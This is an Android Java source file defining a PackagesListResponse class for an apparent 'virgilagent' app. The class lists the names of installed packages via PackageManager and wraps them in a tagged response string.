package com.virgil.virgilagent.response;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import java.util.List;
import java.util.Map;

public class PackagesListResponse extends ResponseBase {
    private static String ListTag = "packages_list";
    private static String PackageTag = "package";
    private static String NameTag = "packagename";

    public PackagesListResponse(Map<String,String> Args) {
        super(Args);
    }

    public boolean Execute(Context InvokerContext) {
        try {
            String PackageElements = "";
            PackageManager pm = InvokerContext.getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(0);
            for (PackageInfo packageInfo : packages) {
                PackageElements += CreateElement(PackageTag, CreateElement(NameTag, packageInfo.packageName));
            }
            this.ResponseText = CreateElement(ListTag, PackageElements);
            return true;
        }
        catch (Exception e) {
            CreateErrorResponse(e.getMessage());
            return true;
        }
    }
}
